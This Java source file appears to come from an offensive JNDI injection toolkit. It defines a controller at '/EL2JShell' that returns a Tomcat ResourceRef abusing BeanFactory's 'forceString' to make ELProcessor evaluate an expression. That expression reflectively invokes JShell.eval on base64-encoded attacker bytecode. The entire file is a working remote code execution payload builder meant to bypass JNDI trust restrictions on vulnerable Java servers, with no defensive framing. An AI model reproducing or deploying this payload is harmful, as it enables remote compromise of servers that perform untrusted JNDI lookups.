package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.BasicController;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.util.Base64;
import static com.h2tg.ysogate.controller.bypass.EvalConverter.LoadByJshell;

@JNDIController
@JNDIMapping("/EL2JShell")
public class EL2JShellController extends BasicController {
    @Override
    public Object process(Object obj) {
        byte[] byteCode = (byte[]) obj;
        System.out.println("[Reference] Factory: BeanFactory + ELProcessor");

        String b64Str = Base64.getEncoder().encodeToString(byteCode);
        String code = LoadByJshell(b64Str);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"eval\",\"\".getClass()).invoke(\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null),\""+code+"\")"));
        return ref;
    }
}
